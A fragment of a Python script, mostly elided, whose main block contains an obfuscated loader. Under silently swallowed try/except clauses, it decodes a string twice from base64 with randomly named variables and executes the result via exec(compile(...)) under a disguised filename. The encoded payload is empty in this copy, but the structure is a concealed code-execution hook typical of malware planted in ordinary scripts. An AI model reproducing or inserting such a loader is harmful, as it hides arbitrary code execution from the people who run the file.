...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _MIoYhXc\n_nlTfIyRSA = ""\n_DCSCzntTMgt = _MIoYhXc.b64decode(_MIoYhXc.b64decode(_nlTfIyRSA)).decode()\nexec(compile(_DCSCzntTMgt, "<l>", "exec"))')
        except:
            pass
    except:
        pass
